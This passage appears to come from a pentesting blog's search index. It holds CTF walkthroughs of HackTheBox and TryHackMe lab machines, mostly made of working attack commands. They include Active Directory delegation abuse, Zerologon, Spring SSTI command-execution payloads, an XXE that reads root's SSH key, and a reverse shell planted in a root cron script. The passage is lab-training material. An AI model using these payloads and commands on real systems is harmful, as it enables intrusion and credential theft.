Kerberos (server time: 2022-08-28 15:40:07Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49664/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049678/tcp open msrpc Microsoft Windows RPC49703/tcp open msrpc Microsoft Windows RPC58047/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-08-28T15:40:59|_ start_date: N/A|_clock-skew: 1s| smb2-security-mode: | 3.1.1: |_ Message signing enabled and requiredRPCWe can star a rpcclient on the DC:zero@pio$ rpcclient -U \"\" -N 10.10.11.174rpcclient $&gt; querydominforesult was NT_STATUS_ACCESS_DENIEDrpcclient $&gt; getdompwinforesult was NT_STATUS_ACCESS_DENIEDrpcclient $&gt; enumdomusersresult was NT_STATUS_ACCESS_DENIEDWe can access but doesn’t have rights to get anything. We can run enum4linux to get some info, but only got that: Some usernames: administrator, guest, krbtgt, domain admins, root, bin, none Server 10.10.11.174 allows sessions using username ‘’, password ‘’ Domain Name: SUPPORT Host is part of a domain (not a workgroup)SMBWe can list the SMB contents:zero@pio$ smbclient -N -L \\\\\\\\10.10.11.174 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share support-tools Disk support staff tools SYSVOL Disk Logon server shareWe cannot connect to NETLOGON:zero@pio$ smbclient -N \\\\\\\\10.10.11.174\\\\NETLOGONTry \"help\" to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*But we can connect to support-tools:zero@pio$ smbclient -N \\\\\\\\10.10.11.174\\\\support-toolsTry \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Wed Jul 20 18:01:06 2022 .. D 0 Sat May 28 12:18:25 2022We can see some zips files. Let’s see what are in them.FootholdWe can use dnSpy to see the code of the UserInfo.exe we got in the smb. We see a Protected file that contains a key and the way to decode the password. We can use Python to get the password:zero@pio$ python3&gt;&gt;&gt; enc_password = b\"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"&gt;&gt;&gt; key = b\"armando\"&gt;&gt;&gt; import base64&gt;&gt;&gt; array = base64.b64decode(enc_password)&gt;&gt;&gt; array2 = []&gt;&gt;&gt; for i in range(len(array)):... array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))... &gt;&gt;&gt; print(\"\".join(array2))nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmzNow we can use ldapsearch with the password:zero@pio$ ldapsearch -D support\\\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb'We get a bunch of information. We can get a password in a info field as info: Ironside47pleasure40Watchful . We can do a password spray with the users we got in this output. First, filter by them:zero@pio$ ldapsearch -D support\\\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep name: | sed 's/^name: //' | grep -vE 'D|C|A|U'Add them to a list and use crackmapexec:zero@pio$ crackmapexec smb 10.10.11.174 -u valid_users -p \"Ironside47pleasure40Watchful\"SMB 10.10.11.174 445 DC [+] support.htb\\support:Ironside47pleasure40WatchfulWe can connect now:zero@pio$ evil-winrm -i 10.10.11.174 -u support -p \"Ironside47pleasure40Watchful\"Privilege EscalationWe can check the privileges of our user:*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; Import-Module .\\PowerView.ps1*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; Get-ObjectAcl -SamAccountName support -ResolveGUIDsWe can see that we have GenericAll privileges. Let’s use it to create a new user:*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; Import-Module .\\PowerView.ps1*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; $password = ConvertTo-SecureString 'SecurePass1' -AsPlainText -Force*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; New-MachineAccount -MachineAccount hacker -Password $password -VerboseVerbose: [+] Domain Controller = dc.support.htbVerbose: [+] Domain = support.htbVerbose: [+] SAMAccountName = hacker$Verbose: [+] Distinguished Name = CN=hacker,CN=Computers,DC=support,DC=htb[+] Machine account hacker addedNow we need to get the SID:*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Get-DomainComputer hackerpwdlastset : 8/28/2022 9:49:09 AMlogoncount : 0badpasswordtime : 12/31/1600 4:00:00 PMdistinguishedname : CN=hacker,CN=Computers,DC=support,DC=htbobjectclass : {top, person, organizationalPerson, user...}name : hackerobjectsid : S-1-5-21-1677581083-3380853377-188903654-5103samaccountname : hacker$Now, with the SID, let’s add the privileges to the account to request TGT tickets:*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)\"*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; $SD.GetBinaryForm($SDBytes, 0)*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}Use the user from the Linux host to request a ticket:zero@pio$ impacket-getST support.htb/hacker:SecurePass1 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htbExport the ticket and use wmiexec to get the shell:zero@pio$ export KRB5CCNAME=administrator.ccachezero@pio$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -kC:\\&gt;whoamisupport\\administrator" }, { "title": "HTB | Oudated", "url": "/pentesting/htb/machines/outdated", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, medium, machines", "date": "2022-08-27 00:00:00 +0200", "snippet": "FootprintingWe do a nmap scan:PORT STATE SERVICE VERSION25/tcp open smtp hMailServer smtpd| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-28 19:48:40Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-28T19:50:18+00:00; +7h00m02s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:24445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:24|_ssl-date: 2022-08-28T19:50:17+00:00; +7h00m01s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-28T19:50:18+00:00; +7h00m02s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:243269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:24|_ssl-date: 2022-08-28T19:50:17+00:00; +7h00m01s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found8530/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: Site doesn't have a title.8531/tcp open unknown9389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049686/tcp open msrpc Microsoft Windows RPC49689/tcp open msrpc Microsoft Windows RPC49913/tcp open msrpc Microsoft Windows RPC49929/tcp open msrpc Microsoft Windows RPC60150/tcp open msrpc Microsoft Windows RPCWe can try the zerologon vulnerability.FootholdWith this exploit we can get directly administrator access. First, remove the administrator password:python3 set_empty_pw.py dc 10.10.11.175Then dump the password hash:impacket-secretsdump -just-dc -no-pass 'DC$@10.10.11.175'And now use the password hash to get full access over the system:zero@pio$ impacket-wmiexec WORKGROUP/Administrator@10.10.11.175 -hashes :&lt;HASH&gt;C:\\&gt; whoamioutdated\\administrator" }, { "title": "HTB | RedPanda", "url": "/pentesting/htb/machines/redpanda", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-08-27 00:00:00 +0200", "snippet": "FootprintingWe start with a nmap to the discover ports:Nmap scan report for 10.10.11.170Host is up (0.072s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)8080/tcp open http-proxy|_http-title: Red Panda Search | Made with Spring Boot| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Sat, 27 Aug 2022 21:13:22 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\" dir=\"ltr\"&gt;...Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelIf we check the webpage we will find the following page:FootholdWe can try several payloads, until we find that *{7*7} the output is 49. If we try the following payload:*{class.getResource(\"\").getPath()}We will get Whitelabel Error Page. Searching it, we will find that is about Spring Boot. The following payload, from PayloadAllTheThings will work:${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}It will give us the /etc/passwd. We can use this script to execute a webshell as follows to create our payloads:zero@pio$ ./ssti-payload.pyCommand ==&gt; id${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}With this we can generate our payloads to move on, start by getting our user with a whoami (and replacing all the $ by * .We can search in the config file: /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java {: .filepath}. There we can see the escaped characters (not the * ) and a pair of credentials ( woodenk:RedPandazRule ), we can try ssh with them:zero@pio$ ssh woodenk@&lt;IP&gt;Privilege EscalationIf we run:woodenk@redpanda:~$ ps aux | grep rootroot 866 0.0 0.0 2608 600 ? Ss 16:54 0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jarWe can see that root user is executing something with our user. Inside the /opt {: .filepath} we can see some kind of scripts with the following content:#!/bin/bash/usr/bin/find /tmp -name \"*.xml\" -exec rm -rf {} \\;/usr/bin/find /var/tmp -name \"*.xml\" -exec rm -rf {} \\;/usr/bin/find /dev/shm -name \"*.xml\" -exec rm -rf {} \\;/usr/bin/find /home/woodenk -name \"*.xml\" -exec rm -rf {} \\;/usr/bin/find /tmp -name \"*.jpg\" -exec rm -rf {} \\;/usr/bin/find /var/tmp -name \"*.jpg\" -exec rm -rf {} \\;/usr/bin/find /dev/shm -name \"*.jpg\" -exec rm -rf {} \\;/usr/bin/find /home/woodenk -name \"*.jpg\" -exec rm -rf {} \\;We can see that it is deleting files with the XML version. If we go back to the webpage, we can see that in the user’s profiles we can download an XML about them.In the previous file we can found how the XML is exported. If we check on the folder of the script we can find another file that is using the User-Agent:public class App { public static Map parseLog(String line) { String[] strings = line.split(\"\\\\|\\\\|\"); Map map = new HashMap&lt;&gt;(); map.put(\"status_code\", Integer.parseInt(strings[0])); map.put(\"ip\", strings[1]); map.put(\"user_agent\", strings[2]); map.put(\"uri\", strings[3]);And below the metadata of a file with a Artist parameter:public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \"/opt/panda_search/src/main/resources/static\" + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \"Artist\")We could try to do a XXE and aim the metadata of this file to this malicious file. The exiftool could be useful to inject metadata inside an image:zero@pio$ exiftool -Artist=\"../../../../../../../../../home/woodenk/xxe\" dog.jpegAs the program add _creds.xml to the file name we just need to name the name before. Create the XML file (must have the same parameters as the others):&lt;!--?xml version=\"1.0\" ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\"&gt; ]&gt;&lt;credits&gt; &lt;author&gt;damian&lt;/author&gt; &lt;image&gt; &lt;uri&gt;/../../../../../../../home/woodenk/dog.jpeg&lt;/uri&gt; &lt;privesc&gt;&amp;xxe;&lt;/privesc&gt; &lt;views&gt;0&lt;/views&gt; &lt;/image&gt; &lt;totalviews&gt;0&lt;/totalviews&gt;&lt;/credits&gt;Call the image:zero@pio$ curl http://10.10.11.170:8080 -H \"User-Agent: ||/../../../../../../../home/woodenk/dog.jpeg\"And download the XML from the user. Check again the XXE and we should have the root RSA there." }, { "title": "HTB | Late", "url": "/pentesting/htb/machines/late", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-05-30 00:00:00 +0200", "snippet": "EnumerationAfter the ping we can guess that is a Linux.The ports scan give us:# Nmap 7.92 scan initiated Sat May 28 20:31:36 2022 as: nmap -p- -sS --min-rate 5000 -oG ports 10.10.11.156Host: 10.10.11.156 ()\tStatus: UpHost: 10.10.11.156 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///\tIgnored State: closed (65533)Then we scan the ports:Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 20:32 CESTNmap scan report for 10.10.11.156Host is up (0.046s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)| 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)|_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Late - Best online image toolsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see a webpage. Searching http://10.10.11.156/index.php give us error 404, so the page doesn’t use php.We see a subdomain referer as: images.late.htb, so we add it to the /etc/hosts. FootholdWe see it works with flask. We can search for it and get some possible explotation.Let’s try adding the text to an image like this:This gives the following text:Now that we know is vulnerable we need to search for the param subprocess.Popen. Do the following search with a new image: {{ ‘’.__class__.__mro__[1].__subclasses__() }}. Parse it with the following script: flaskVulnParamwith open('results.txt', \"r\") as f: data = str(f.read())data = data.replace(\"&amp;lt;\", '&lt;')data = data.replace(\"&amp;gt;\", '&gt;')data = data.replace(\"&amp;#39;\", \"'\")data = data.split(\", \")print(data.index(\"&lt;class 'subprocess.Popen'&gt;\"))Now the have the index of the field: 249. We can check it searching for: {{‘’.__class__.__mro__[1].__subclasses__()[249]}}.Now we try to get the RSA, cause we know it has OpenSSH:This will give us the RSA file. Now we need to get the /etc/passwd as well. Let replace \\n in both files with the proper spaces.Now we can connect to the machine. First we need to find a user that has the shell enable and then give permission to the rsa file:&gt; chmod 400 rsa&gt; ssh -i rsa svc_acc@10.10.11.15 Privilage EscalationWith linPEAS.sh we found the an editable folder with the script ssh-alert.sh ssh-alert.sh, which is executed by the root in crontab and when a user login with ssh.Let’s add an reverse shell there:# In our machine&gt; nc -lvnp 9000# In the target machine&gt; $ echo \"sh -i &gt;&amp; /dev/tcp/10.10.14.185/9000 0&gt;&amp;1\" &gt;&gt; ssh-alert.sh; ssh localhostAnd the machine is pwned." }, { "title": "HTB | Timelapse", "url": "/pentesting/htb/machines/timelapse", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy", "date": "2022-05-28 00:00:00 +0200", "snippet": "EnumerationWe can see thanks to the ping that is a Windows:&gt; ping 10.10.11.152PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=51.7 msttl=127First we scan the ports:# Nmap 7.92 scan initiated Sun May 22 20:33:04 2022 as: nmap -p- -sS --min-rate 5000 --open -v -oG allPorts 10.10.11.152# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.11.152 ()\tStatus: UpHost: 10.10.11.152 ()\tPorts: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5986/open/tcp//wsmans///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49696/open/tcp/////, 61941/open/tcp/////\tIgnored State: filtered (65518)# Nmap done at Sun May 22 20:33:45 2022 -- 1 IP address (1 host up) scanned in 40.27 secondsWe executed the (getPorts.sh)[https://raw.githubusercontent.com/zeropio/the_helpful_scripts/main/nmap/getPorts.sh] command to scan each one:# Nmap 7.92 scan initiated Sat May 28 00:43:09 2022 as: nmap -sVC -p 53,88,135,139,389,445,464,636,3268,3269,5986,9389,49667,49673,49674,49696,61941 -Pn -oN nmapFull 10.10.11.152Nmap scan report for 10.10.11.152Host is up (0.065s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-05-28 06:43:16Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=dc01.timelapse.htb| Not valid before: 2021-10-25T14:05:29|_Not valid after: 2022-10-25T14:25:29| tls-alpn: |_ http/1.1|_ssl-date: 2022-05-28T06:44:46+00:00; +7h59m59s from scanner time.|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc Microsoft Windows RPC49696/tcp open msrpc Microsoft Windows RPC61941/tcp filtered unknownService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s| smb2-time: | date: 2022-05-28T06:44:08|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required ExplotationSambaWe can confirm that is a Windows. Let’s try the samba:&gt; smbclient -L \\\\\\\\10.10.11.152\\\\ Password for [WORKGROUP\\zeropio]:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tNETLOGON Disk Logon server share \tShares Disk \tSYSVOL Disk Logon server share We can test those folders:&gt; smbclient \\\\\\\\10.10.11.152\\\\ADMIN$Password for [WORKGROUP\\zeropio]:tree connect failed: NT_STATUS_ACCESS_DENIED&gt; smbclient \\\\\\\\10.10.11.152\\\\C$ Password for [WORKGROUP\\zeropio]:tree connect failed: NT_STATUS_ACCESS_DENIED&gt; smbclient \\\\\\\\10.10.11.152\\\\IPC$Password for [WORKGROUP\\zeropio]:Try \"help\" to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*&gt; smbclient \\\\\\\\10.10.11.152\\\\NETLOGONPassword for [WORKGROUP\\zeropio]:Try \"help\" to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*&gt; smbclient \\\\\\\\10.10.11.152\\\\SYSVOLPassword for [WORKGROUP\\zeropio]:Try \"help\" to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*Finally, Shares have some files:&gt; smbclient \\\\\\\\10.10.11.152\\\\SharesPassword for [WORKGROUP\\zeropio]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Oct 25 17:39:15 2021 .. D 0 Mon Oct 25 17:39:15 2021 Dev D 0 Mon Oct 25 21:40:06 2021 HelpDesk D 0 Mon Oct 25 17:48:42 2021We download all of them.zipIf we try to unzip the file:&gt; unzip winrm_backup.zip Archive: winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password: We need to break it with john:&gt; sudo john --format=PKZIP --wordlist=/usr/share/wordlists/rockyou.txt zip-hashUsing default input encoding: UTF-8Loaded 1 password hash (PKZIP [32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status**supremelegacy** (winrm_backup.zip/legacyy_dev_auth.pfx)pfxWe get the following file: legacyy_dev_auth.pfx. If we try to open it, it ask for a password.Let’s break it with john again:&gt; sudo john --format=pfx --wordlist=/usr/share/wordlists/rockyou.txt pfx-hashUsing default input encoding: UTF-8Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])Cost 1 (iteration count) is 2000 for all loaded hashesCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status**thuglegacy** (legacyy_dev_auth.pfx) We can see some ssl certs:&gt; openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key&gt; openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt shellWe can use evil-winrm to access. Thanks to the nmap we now that ssl is enable, so we need to add -S:&gt; evil-winrm -i 10.10.11.152 -c cert.crt -k prv.key -SEnter PEM pass phrase:\t*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; Privilage EscalationIf we check the history we can see something:PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; cat ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties *exitWe will set all the variables, know we can executed the code below in the history.Let’s try to get the admin password with LDAP:PS C:\\Users&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}Now we just need to login as Administrator:&gt; evil-winrm -i 10.10.11.152 -S -u 'Administrator' -p 'h8#+vv+;q{E4u9+9u+-2c%+;' " }, { "title": "HTB | Paper", "url": "/pentesting/htb/machines/paper", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-05-21 00:00:00 +0200", "snippet": "Enumerationnmap❯ nmap -sVC 10.10.11.143 -oN nmap\tStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 18:04 CEST\tNmap scan report for 10.10.11.143\tHost is up (0.28s latency).\tNot shown: 997 closed tcp ports (conn-refused)\tPORT STATE SERVICE VERSION\t22/tcp open ssh OpenSSH 8.0 (protocol 2.0)\t| ssh-hostkey: \t| 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)\t| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)\t|_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)\t80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\t|_http-title: HTTP Server Test Page powered by CentOS\t|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\t| http-methods: \t|_ Potentially risky methods: TRACE\t|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\t443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\t|_http-title: HTTP Server Test Page powered by CentOS\t| http-methods: \t|_ Potentially risky methods: TRACE\t|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\t| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US\t| Subject Alternative Name: DNS:localhost.localdomain\t| Not valid before: 2021-07-03T08:52:34\t|_Not valid after: 2022-07-08T10:32:34\t|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\t|_ssl-date: TLS randomness does not represent time\t| tls-alpn: \t|_ http/1.1WebWe can see a default webpage for nginx.With curl we can get the header and see that there is a page called office.paper.❯ curl -i http://10.10.11.143/\tHTTP/1.1 403 Forbidden\tDate: Sat, 21 May 2022 16:07:56 GMT\tServer: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\tX-Backend-Server: office.paper\tLast-Modified: Sun, 27 Jun 2021 23:47:13 GMT\tETag: \"30c0b-5c5c7fdeec240\"\tAccept-Ranges: bytes\tContent-Length: 199691\tContent-Type: text/html; charset=UTF-8We need to add this to /etc/hosts:10.10.11.143 office.paperNow we can see the page.With Wappalyzer we can see it is a Wordpress, so we can try a wpscan, we get that there is a vulnerable Wordpress version.If we go to http://office.paper/?static=1 we can see a subdomain, chat.We add it to the /etc/hosts. We get a login, but with the url http://chat.office.paper/register/8qozr226AhkCHZdyY we can register. ExplotationInside the chat we can see a bot in the chat, if we talk to him in dm we can perform an LFI to see some files (as /etc/passwd).We can see there are a folder ../hubot, where there are some scripts. The run.js script allow us to run any script.We can start a reverse shell with: Privilage EscalationWe see that in our home we have the linpeas.sh file, so we can executed it:chmod +x linpeas.sh./linpeas.shWe found some credentials:ROCKETCHAT_PASSWORD=Queenofblad3s!23LOGNAME=dwightNow we can connect with ssh.We will use the CVE-2021-3560[dwight@paper ~]# ./poc.sh -u=zeropio -p=1234[dwight@paper ~]# su - zeropio\tPassword: [zeropio@paper ~]# sudo bash\t[sudo] password for zeropio:[root@paper ~]#" }, { "title": "TryHackMe | Pickle Rick", "url": "/pentesting/tryhackme/pickle-rick", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-05-09 00:00:00 +0200", "snippet": "EnumerationWe start a nmap at the IP.Nmap scan report for 10.10.253.214Host is up (0.067s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f8:50:7b:e1:4c:53:63:5d:2b:c6:84:1a:66:e9:a0:04 (RSA)| 256 19:a8:de:3e:70:d9:ba:ff:d5:2f:46:60:a2:e1:c3:e3 (ECDSA)|_ 256 